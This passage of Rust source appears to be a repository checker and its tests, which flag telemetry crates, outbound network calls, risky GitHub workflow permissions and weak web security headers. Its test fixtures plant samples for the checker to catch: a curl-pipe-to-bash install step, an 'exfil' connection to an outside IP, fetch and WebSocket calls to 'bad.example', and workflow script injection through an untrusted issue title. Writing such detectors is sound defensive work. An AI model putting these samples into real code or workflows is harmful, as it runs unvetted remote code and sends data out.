fn collect_workflow_and_action_files(root: &Path) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    let wf_dir = root.join(".github").join("workflows");
    if std::fs::symlink_metadata(&wf_dir).is_ok_and(|m| m.is_dir()) {
        let entries = std::fs::read_dir(&wf_dir).map_err(|e| format!("read_dir .github/workflows: {e}"))?;
        for entry in entries {
            let entry = entry.map_err(|e| format!("dir entry .github/workflows: {e}"))?;
            let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
            let path = entry.path();
            if ft.is_file()
                && path.extension().and_then(|e| e.to_str()).is_some_and(|e| e.eq_ignore_ascii_case("yml") || e.eq_ignore_ascii_case("yaml"))
            {
                out.push(rel_slash(root, &path));
            }
        }
    }
    let actions_dir = root.join(".github").join("actions");
    if std::fs::symlink_metadata(&actions_dir).is_ok_and(|m| m.is_dir()) {
        collect_yaml_files_under(root, &actions_dir, &mut out)?;
    }
    out.sort();
    out.dedup();
    Ok(out)
}

fn collect_yaml_files_under(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
    for entry in std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))? {
        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
        let path = entry.path();
        if ft.is_dir() {
            collect_yaml_files_under(root, &path, out)?;
        } else if ft.is_file()
            && path.extension().and_then(|e| e.to_str()).is_some_and(|e| e.eq_ignore_ascii_case("yml") || e.eq_ignore_ascii_case("yaml"))
        {
            out.push(rel_slash(root, &path));
        }
    }
    Ok(())
}

fn collect_files_named(dir: &Path, target_name: &str, out: &mut Vec<PathBuf>) -> Result<(), String> {
    let entries = std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))?;
    for entry in entries {
        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
        let path = entry.path();
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        if ft.is_dir() {
            if name_str == "target" || name_str == "dist" || name_str == "corpus" || name_str.starts_with('.') {
                continue;
            }
            collect_files_named(&path, target_name, out)?;
        } else if ft.is_file() && name_str == target_name {
            out.push(path);
        }
    }
    Ok(())
}

fn collect_all_files_under(root: &Path, dir: &Path, out: &mut Vec<String>) -> Result<(), String> {
    let entries = std::fs::read_dir(dir).map_err(|e| format!("read_dir {}: {e}", dir.display()))?;
    for entry in entries {
        let entry = entry.map_err(|e| format!("dir entry {}: {e}", dir.display()))?;
        let ft = entry.file_type().map_err(|e| format!("file_type {}: {e}", entry.path().display()))?;
        let path = entry.path();
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        if ft.is_dir() {
            if name_str == "target" || name_str == "dist" || name_str == ".git" {
                continue;
            }
            collect_all_files_under(root, &path, out)?;
        } else if ft.is_file() {
            out.push(rel_slash(root, &path));
        }
    }
    Ok(())
}

fn rel_slash(root: &Path, path: &Path) -> String {
    path.strip_prefix(root).unwrap_or(path).to_string_lossy().replace('\\', "/")
}

fn next_ident_pattern_match(line: &str, from: usize, patterns: &[&'static str]) -> Option<(usize, &'static str)> {
    let bytes = line.as_bytes();
    let mut best: Option<(usize, &'static str)> = None;
    for &pat in patterns {
        let mut search = from;
        while let Some(rel) = line.get(search..).and_then(|s| s.find(pat)) {
            let pos = search + rel;
            let end = pos + pat.len();
            let left_ok = pos == 0 || !is_ident_byte(bytes[pos - 1]);
            let right_ok = end == bytes.len() || !is_ident_byte(bytes[end]);
            if left_ok && right_ok {
                let replace = match best {
                    None => true,
                    Some((best_pos, best_pat)) => pos < best_pos || (pos == best_pos && pat.len() > best_pat.len()),
                };
                if replace {
                    best = Some((pos, pat));
                }
                break;
            }
            search = pos + line.get(pos..).and_then(|s| s.chars().next()).map_or(1, char::len_utf8);
        }
    }
    best
}

fn leading_spaces(s: &str) -> usize {
    s.bytes().take_while(|&b| b == b' ').count()
}

fn strip_yaml_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut in_dq = false;
    let mut in_sq = false;
    let mut escaped = false;
    for (i, ch) in line.char_indices() {
        if in_dq {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == '"' {
                in_dq = false;
            }
        } else if in_sq {
            if ch == '\'' {
                in_sq = false;
            }
        } else {
            match ch {
                '"' => in_dq = true,
                '\'' => in_sq = true,
                '#' if i == 0 || bytes[i - 1].is_ascii_whitespace() => return line.get(..i).unwrap_or(line),
                _ => {}
            }
        }
    }
    line
}

fn unquote_yaml_scalar(s: &str) -> &str {
    let t = s.trim();
    t.strip_prefix('"').and_then(|r| r.strip_suffix('"')).or_else(|| t.strip_prefix('\'').and_then(|r| r.strip_suffix('\''))).unwrap_or(t)
}

#[cfg(test)]
mod tests {
    use std::path::{Path, PathBuf};
    use std::sync::atomic::{AtomicU64, Ordering};

    use super::{is_banned_crate_name, run, run_checks};

    static TEMP_SEQ: AtomicU64 = AtomicU64::new(0);

    struct TempDirGuard {
        path: PathBuf,
    }

    impl TempDirGuard {
        fn new(label: &str) -> Self {
            let seq = TEMP_SEQ.fetch_add(1, Ordering::Relaxed);
            let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map_or(0, |d| d.as_nanos());
            let path = std::env::temp_dir().join(format!("curvebook-telemetry-{label}-{}-{nanos}-{seq}", std::process::id()));
            std::fs::create_dir_all(&path).unwrap();
            Self { path }
        }

        fn write(&self, rel: &str, content: &str) {
            let p = self.path.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, content).unwrap();
        }
    }

    impl Drop for TempDirGuard {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.path);
        }
    }

    fn create_clean_fixture(label: &str) -> TempDirGuard {
        let dir = TempDirGuard::new(label);
        dir.write("Cargo.toml", "[workspace]\nmembers = [\"crates/core\", \"crates/mcp\"]\n");
        dir.write("Cargo.lock", "[[package]]\nname = \"serde\"\nversion = \"1.0.229\"\n");
        dir.write("crates/core/Cargo.toml", "[package]\nname = \"curvebook-core\"\nversion = \"0.1.0\"\n[dependencies]\nserde = \"1\"\n");
        dir.write(
            "crates/core/src/lib.rs",
            "// TcpStream in comment is fine\npub fn label() -> &'static str { \"std::net::TcpStream\" }\n#[cfg(test)]\nmod tests {\n    use std::net::UdpSocket;\n}\n",
        );
        dir.write(
            "crates/mcp/src/tools.rs",
            "use std::net::{SocketAddr, TcpStream};\npub fn addr(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\n",
        );
        dir.write("apps/curvebook-web/index.html", "<!DOCTYPE html><html><body><svg xmlns=\"http://www.w3.org/2000/svg\"></svg></body></html>\n");
        dir.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
        );
        dir.write(
            ".github/workflows/release.yml",
            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo build\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n",
        );
        dir.write(
            "packaging/web/_headers",
            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n",
        );
        dir.write(
            "packaging/web/.htaccess",
            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
        );
        dir.write("packaging/windows/check.ps1", "while ($null -ne ($record = $view.Fetch())) {}\n");
        dir
    }

    #[test]
    fn clean_real_workspace_passes_all_five_checks() {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
        let (stats, violations) = run_checks(root).unwrap();
        assert!(violations.is_empty(), "real workspace violations:\n{violations:?}");
        assert!(stats.manifests >= 20);
        assert!(stats.lock_packages >= 20);
        assert!(stats.rust_sources >= 50);
        assert!(stats.workflows >= 4);
        assert_eq!(stats.header_configs, 2);
        run(root, &[]).unwrap();
    }

    #[test]
    fn synthetic_clean_fixture_passes_and_rejects_bad_args() {
        let dir = create_clean_fixture("clean");
        run(&dir.path, &[]).unwrap();
        assert!(run(&dir.path, &[String::from("--unknown")]).is_err());
    }

    #[test]
    fn check1_flags_banned_crates_in_manifests_and_lockfile() {
        assert!(is_banned_crate_name("sentry"));
        assert!(is_banned_crate_name("sentry-core"));
        assert!(is_banned_crate_name("opentelemetry_sdk"));
        assert!(is_banned_crate_name("tracing-opentelemetry"));
        assert!(is_banned_crate_name("posthog-rs"));
        assert!(is_banned_crate_name("reqwest"));
        assert!(is_banned_crate_name("hyper"));
        assert!(!is_banned_crate_name("hyperbolic"));
        assert!(!is_banned_crate_name("serde"));

        let dir = create_clean_fixture("check1-manifest");
        dir.write(
            "crates/core/Cargo.toml",
            "[package]\nname = \"curvebook-core\"\n[dependencies]\nclient = { package = \"reqwest\", version = \"0.12\" }\n",
        );
        let (_, hits) = run_checks(&dir.path).unwrap();
        assert!(hits.iter().any(|v| v.check == 1 && v.detail.contains("reqwest")), "{hits:?}");

        let dir2 = create_clean_fixture("check1-lock");
        dir2.write("Cargo.lock", "[[package]]\nname = \"sentry-core\"\nversion = \"0.34.0\"\n");
        let (_, hits2) = run_checks(&dir2.path).unwrap();
        assert!(hits2.iter().any(|v| v.check == 1 && v.path == "Cargo.lock" && v.detail.contains("sentry-core")), "{hits2:?}");
    }

    #[test]
    fn check2_flags_unapproved_net_udp_and_missing_loopback_guard() {
        let dir = create_clean_fixture("check2-unapproved");
        dir.write("crates/core/src/net_bad.rs", "pub fn leak() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n");
        let (_, hits) = run_checks(&dir.path).unwrap();
        assert!(hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/net_bad.rs"), "{hits:?}");

        let dir2 = create_clean_fixture("check2-udp");
        dir2.write("apps/curvebook/src/main.rs", "use std::net::UdpSocket;\npub fn f() { let _ = UdpSocket::bind(\"127.0.0.1:0\"); }\n");
        let (_, hits2) = run_checks(&dir2.path).unwrap();
        assert!(hits2.iter().any(|v| v.check == 2 && v.detail.contains("UdpSocket")), "{hits2:?}");

        let dir3 = create_clean_fixture("check2-no-loopback");
        dir3.write(
            "crates/ui-egui/src/control_io.rs",
            "use std::net::TcpListener;\npub fn bind_all() { let _ = TcpListener::bind(\"0.0.0.0:9000\"); }\n",
        );
        let (_, hits3) = run_checks(&dir3.path).unwrap();
        assert!(hits3.iter().any(|v| v.check == 2 && v.detail.contains("loopback guard")), "{hits3:?}");
    }

    #[test]
    fn check3_flags_telemetry_terms_fetch_and_external_urls() {
        let dir = create_clean_fixture("check3-wf");
        dir.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo $SONAR_TOKEN\n",
        );
        let (_, hits) = run_checks(&dir.path).unwrap();
        assert!(hits.iter().any(|v| v.check == 3 && v.detail.contains("sonar_token")), "{hits:?}");

        let dir2 = create_clean_fixture("check3-web");
        dir2.write(
            "apps/curvebook-web/index.html",
            "<html><script>window.fetch('https://example.com/p'); navigator.sendBeacon('/t');</script></html>\n",
        );
        let (_, hits2) = run_checks(&dir2.path).unwrap();
        assert!(hits2.iter().any(|v| v.check == 3 && v.detail.contains("fetch(")), "{hits2:?}");
        assert!(hits2.iter().any(|v| v.check == 3 && v.detail.contains("sendbeacon")), "{hits2:?}");
        assert!(hits2.iter().any(|v| v.check == 3 && v.detail.contains("https://example.com/p")), "{hits2:?}");
    }

    #[test]
    fn check4_flags_missing_permissions_bad_write_and_event_injection() {
        let dir = create_clean_fixture("check4-perms");
        dir.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
        );
        let (_, hits) = run_checks(&dir.path).unwrap();
        assert!(hits.iter().any(|v| v.check == 4 && v.detail.contains("contents: read")), "{hits:?}");

        let dir2 = create_clean_fixture("check4-write");
        dir2.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  gate:\n    permissions:\n      contents: write\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
        );
        let (_, hits2) = run_checks(&dir2.path).unwrap();
        assert!(hits2.iter().any(|v| v.check == 4 && v.detail.contains("write permission")), "{hits2:?}");

        let dir3 = create_clean_fixture("check4-inject");
        dir3.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [issues]\npermissions:\n  contents: read\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Bad\n        run: |\n          echo \"${{ github.event.issue.title }}\"\n",
        );
        let (_, hits3) = run_checks(&dir3.path).unwrap();
        assert!(hits3.iter().any(|v| v.check == 4 && v.detail.contains("github.event.")), "{hits3:?}");
    }

    #[test]
    fn check4_allows_release_publish_attestation_writes_and_rejects_elsewhere() {
        let has_bad_write = |hits: &[super::TelemetryViolation], path: &str, scope: &str| {
            let prefix = format!("unexpected write permission `{scope}: write`");
            hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
        };

        let dir_ok = create_clean_fixture("check4-attest-ok");
        dir_ok.write(
            ".github/workflows/release.yml",
            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo --version\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n    steps:\n      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n",
        );
        let (_, ok_hits) = run_checks(&dir_ok.path).unwrap();
        assert!(ok_hits.is_empty(), "expected release.yml publish attestation scopes to pass: {ok_hits:?}");

        let dir_top = create_clean_fixture("check4-attest-top");
        dir_top.write(
            ".github/workflows/release.yml",
            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n",
        );
        let (_, top_hits) = run_checks(&dir_top.path).unwrap();
        assert_eq!(top_hits.len(), 2, "{top_hits:?}");
        assert!(has_bad_write(&top_hits, ".github/workflows/release.yml", "id-token"), "{top_hits:?}");
        assert!(has_bad_write(&top_hits, ".github/workflows/release.yml", "attestations"), "{top_hits:?}");

        let dir_other_job = create_clean_fixture("check4-attest-other-job");
        dir_other_job.write(
            ".github/workflows/release.yml",
            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  git-sources:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  linux:\n    runs-on: ubuntu-latest\n    permissions:\n      attestations: write\n    steps:\n      - run: echo bad\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo ok\n",
        );
        let (_, job_hits) = run_checks(&dir_other_job.path).unwrap();
        assert_eq!(job_hits.len(), 2, "{job_hits:?}");
        assert!(has_bad_write(&job_hits, ".github/workflows/release.yml", "id-token"), "{job_hits:?}");
        assert!(has_bad_write(&job_hits, ".github/workflows/release.yml", "attestations"), "{job_hits:?}");

        let dir_ci = create_clean_fixture("check4-attest-ci");
        dir_ci.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      attestations: write\n    steps:\n      - run: cargo test\n",
        );
        let (_, ci_hits) = run_checks(&dir_ci.path).unwrap();
        assert_eq!(ci_hits.len(), 2, "{ci_hits:?}");
        assert!(has_bad_write(&ci_hits, ".github/workflows/ci.yml", "id-token"), "{ci_hits:?}");
        assert!(has_bad_write(&ci_hits, ".github/workflows/ci.yml", "attestations"), "{ci_hits:?}");

        let dir_ci_top = create_clean_fixture("check4-attest-ci-top");
        dir_ci_top.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\n  id-token: write\n  attestations: write\njobs:\n  gate:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n",
        );
        let (_, ci_top_hits) = run_checks(&dir_ci_top.path).unwrap();
        assert_eq!(ci_top_hits.len(), 2, "{ci_top_hits:?}");
        assert!(has_bad_write(&ci_top_hits, ".github/workflows/ci.yml", "id-token"), "{ci_top_hits:?}");
        assert!(has_bad_write(&ci_top_hits, ".github/workflows/ci.yml", "attestations"), "{ci_top_hits:?}");

        let dir_bad_scope = create_clean_fixture("check4-attest-bad-scope");
        dir_bad_scope.write(
            ".github/workflows/release.yml",
            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n      id-token: write\n      attestations: write\n      packages: write\n    steps:\n      - run: echo ok\n",
        );
        let (_, scope_hits) = run_checks(&dir_bad_scope.path).unwrap();
        assert_eq!(scope_hits.len(), 1, "{scope_hits:?}");
        assert!(has_bad_write(&scope_hits, ".github/workflows/release.yml", "packages"), "{scope_hits:?}");
    }

    #[test]
    fn check4_allows_ci_prune_caches_actions_write_and_rejects_elsewhere() {
        let has_bad_write = |hits: &[super::TelemetryViolation], path: &str, scope: &str| {
            let prefix = format!("unexpected write permission `{scope}: write`");
            hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
        };

        let dir_ok_inline = create_clean_fixture("check4-prune-ok-inline");
        dir_ok_inline.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n  prune-caches:\n    needs: [build]\n    runs-on: ubuntu-latest\n    permissions: { actions: write }\n    steps:\n      - run: gh cache list\n",
        );
        let (_, ok_inline_hits) = run_checks(&dir_ok_inline.path).unwrap();
        assert!(ok_inline_hits.is_empty(), "expected ci.yml prune-caches actions: write (inline) to pass: {ok_inline_hits:?}");

        let dir_ok_block = create_clean_fixture("check4-prune-ok-block");
        dir_ok_block.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo test\n  prune-caches:\n    needs: [build]\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: gh cache list\n",
        );
        let (_, ok_block_hits) = run_checks(&dir_ok_block.path).unwrap();
        assert!(ok_block_hits.is_empty(), "expected ci.yml prune-caches actions: write (block) to pass: {ok_block_hits:?}");

        let dir_top = create_clean_fixture("check4-prune-top");
        dir_top.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\n  actions: write\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh cache list\n",
        );
        let (_, top_hits) = run_checks(&dir_top.path).unwrap();
        assert_eq!(top_hits.len(), 1, "{top_hits:?}");
        assert!(has_bad_write(&top_hits, ".github/workflows/ci.yml", "actions"), "{top_hits:?}");

        let dir_other_job = create_clean_fixture("check4-prune-other-job");
        dir_other_job.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: cargo test\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo bad\n",
        );
        let (_, other_hits) = run_checks(&dir_other_job.path).unwrap();
        assert_eq!(other_hits.len(), 2, "{other_hits:?}");
        assert!(has_bad_write(&other_hits, ".github/workflows/ci.yml", "actions"), "{other_hits:?}");
        assert!(has_bad_write(&other_hits, ".github/workflows/ci.yml", "contents"), "{other_hits:?}");

        let dir_other_wf = create_clean_fixture("check4-prune-other-wf");
        dir_other_wf.write(
            ".github/workflows/release.yml",
            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  prune-caches:\n    runs-on: ubuntu-latest\n    permissions:\n      actions: write\n    steps:\n      - run: echo bad\n",
        );
        let (_, wf_hits) = run_checks(&dir_other_wf.path).unwrap();
        assert_eq!(wf_hits.len(), 1, "{wf_hits:?}");
        assert!(has_bad_write(&wf_hits, ".github/workflows/release.yml", "actions"), "{wf_hits:?}");
    }

    #[test]
    fn check4_r12_9_allows_pages_deploy_job_only() {
        let has_bad_write = |hits: &[super::TelemetryViolation], path: &str, scope: &str| {
            let prefix = format!("unexpected write permission `{scope}: write`");
            hits.iter().any(|v| v.check == 4 && v.path == path && v.detail.starts_with(&prefix))
        };
        let deploy_steps =
            "    steps:\n      - id: deployment\n        uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n";

        let dir_ok_block = create_clean_fixture("check4-pages-ok-block");
        dir_ok_block.write(
            ".github/workflows/pages.yml",
            &format!(
                "name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cargo xtask pages-stage _site\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      id-token: write\n    environment:\n      name: github-pages\n      url: ${{{{ steps.deployment.outputs.page_url }}}}\n{deploy_steps}"
            ),
        );
        let (_, ok_block_hits) = run_checks(&dir_ok_block.path).unwrap();
        assert!(ok_block_hits.is_empty(), "expected pages.yml deploy pages/id-token write (block) to pass: {ok_block_hits:?}");

        let dir_ok_inline = create_clean_fixture("check4-pages-ok-inline");
        dir_ok_inline.write(
            ".github/workflows/pages.yml",
            &format!("name: Pages\non: [push]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions: {{ pages: write, id-token: write }}\n{deploy_steps}"),
        );
        let (_, ok_inline_hits) = run_checks(&dir_ok_inline.path).unwrap();
        assert!(ok_inline_hits.is_empty(), "expected pages.yml deploy pages/id-token write (inline) to pass: {ok_inline_hits:?}");

        // Top level, another job, a wider scope on the deploy job, and another workflow stay rejected.
        let dir_bad = create_clean_fixture("check4-pages-bad");
        dir_bad.write(
            ".github/workflows/pages.yml",
            &format!(
                "name: Pages\non: [push]\npermissions:\n  contents: read\n  pages: write\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: echo bad\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n      contents: write\n{deploy_steps}"
            ),
        );
        dir_bad.write(
            ".github/workflows/release.yml",
            "name: Release\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      pages: write\n    steps:\n      - run: echo bad\n",
        );
        let (_, bad_hits) = run_checks(&dir_bad.path).unwrap();
        assert_eq!(bad_hits.len(), 4, "{bad_hits:?}");
        assert!(has_bad_write(&bad_hits, ".github/workflows/pages.yml", "pages"), "{bad_hits:?}");
        assert!(has_bad_write(&bad_hits, ".github/workflows/pages.yml", "id-token"), "{bad_hits:?}");
        assert!(has_bad_write(&bad_hits, ".github/workflows/pages.yml", "contents"), "{bad_hits:?}");
        assert!(has_bad_write(&bad_hits, ".github/workflows/release.yml", "pages"), "{bad_hits:?}");
    }

    #[test]
    fn check5_flags_weak_or_missing_web_security_headers() {
        let dir = create_clean_fixture("check5-headers");
        dir.write(
            "packaging/web/_headers",
            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self' https://telemetry.example; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=()\n  X-Content-Type-Options: nosniff\n",
        );
        let (_, hits) = run_checks(&dir.path).unwrap();
        assert!(hits.iter().any(|v| v.check == 5 && v.path == "packaging/web/_headers" && v.detail.contains("connect-src 'self'")), "{hits:?}");
        assert!(hits.iter().any(|v| v.check == 5 && v.path == "packaging/web/_headers" && v.detail.contains("geolocation=()")), "{hits:?}");

        let dir2 = create_clean_fixture("check5-htaccess");
        dir2.write("packaging/web/.htaccess", "<IfModule mod_headers.c>\n  Header always set X-Content-Type-Options \"nosniff\"\n</IfModule>\n");
        let (_, hits2) = run_checks(&dir2.path).unwrap();
        assert!(
            hits2.iter().any(|v| v.check == 5 && v.path == "packaging/web/.htaccess" && v.detail.contains("Content-Security-Policy")),
            "{hits2:?}"
        );
        assert!(hits2.iter().any(|v| v.check == 5 && v.path == "packaging/web/.htaccess" && v.detail.contains("Referrer-Policy")), "{hits2:?}");
    }

    #[test]
    fn r2_s13_02_04_05_06_07_telemetry_regression_matrix() {
        // R2-S13-02 & R2-S13-04: with: run:, script:, prepare:, inputs.*, ref_name, SHA pins, curl|bash
        let dir_wf = create_clean_fixture("r2-wf");
        dir_wf.write(
            ".github/workflows/ci.yml",
            "name: CI\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  g:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: vmactions/freebsd-vm@v1\n        with:\n          prepare: echo ${{ github.head_ref }}\n          run: echo ${{ inputs.version }} ${{ github.ref_name }}\n      - run: curl -fsSL https://raw.githubusercontent.com/x/y/main/install.sh | bash\n",
        );
        let (_, wf_hits) = run_checks(&dir_wf.path).unwrap();
        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("SHA")), "{wf_hits:?}");
        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("inputs.*")), "{wf_hits:?}");
        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("github.ref_name")), "{wf_hits:?}");
        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("github.head_ref")), "{wf_hits:?}");
        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("main")), "{wf_hits:?}");

        // R2-S13-05: missing COOP/COEP
        let dir_hdr = create_clean_fixture("r2-hdr");
        dir_hdr.write(
            "packaging/web/_headers",
            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n",
        );
        let (_, hdr_hits) = run_checks(&dir_hdr.path).unwrap();
        assert!(hdr_hits.iter().any(|v| v.check == 5 && v.detail.contains("Cross-Origin-Opener-Policy")), "{hdr_hits:?}");
        assert!(hdr_hits.iter().any(|v| v.check == 5 && v.detail.contains("Cross-Origin-Embedder-Policy")), "{hdr_hits:?}");

        // R2-S13-06 & R2-S13-07: cfg(not(test)), per-fn loopback, build.rs, core::net, js_sys, web assets
        let dir_net = create_clean_fixture("r2-net");
        dir_net.write(
            "crates/mcp/src/tools.rs",
            "use std::net::{SocketAddr, TcpStream};\npub fn safe(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\npub fn exfil() { let _ = TcpStream::connect(\"198.51.100.1:443\"); }\n",
        );
        dir_net.write("crates/text/build.rs", "pub fn main() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n");
        dir_net.write(
            "crates/core/src/prod_cfg.rs",
            "#[cfg(all(unix, not(test)))]\npub fn f() { let _ = core::net::TcpStream::connect(\"1.2.3.4:80\"); }\n",
        );
        dir_net.write("crates/core/src/js.rs", "pub fn f() { let _ = js_sys::Reflect::get(&w, &\"fetch\".into()); }\n");
        dir_net.write(
            "crates/core/Cargo.toml",
            "[package]\nname = \"curvebook-core\"\n[dependencies]\nweb-sys = { version = \"0.3\", features = [\"Window\", \"WebSocket\"] }\n",
        );
        dir_net.write("apps/curvebook-web/extra.js", "fetch ('https://bad.example/p'); const ws = new WebSocket('//bad.example/s');\n");
        let (_, net_hits) = run_checks(&dir_net.path).unwrap();
        assert!(net_hits.iter().any(|v| v.check == 1 && v.detail.contains("WebSocket")), "{net_hits:?}");
        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/mcp/src/tools.rs" && v.detail.contains("loopback")), "{net_hits:?}");
        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/text/build.rs"), "{net_hits:?}");
        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/prod_cfg.rs" && v.detail.contains("core::net")), "{net_hits:?}");
        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/js.rs" && v.detail.contains("fetch")), "{net_hits:?}");
        assert!(net_hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/extra.js" && v.detail.contains("fetch")), "{net_hits:?}");
        assert!(
            net_hits.iter().any(|v| v.check == 3 && v.path == "apps/curvebook-web/extra.js" && v.detail.contains("//bad.example")),
            "{net_hits:?}"
        );
    }

    #[test]
    fn sec22_catches_multiline_toml_const_generic_net_utf16_web_quoted_yaml_and_csp_schemes() {
        let fx = create_clean_fixture("sec22-tel");
        fx.write(
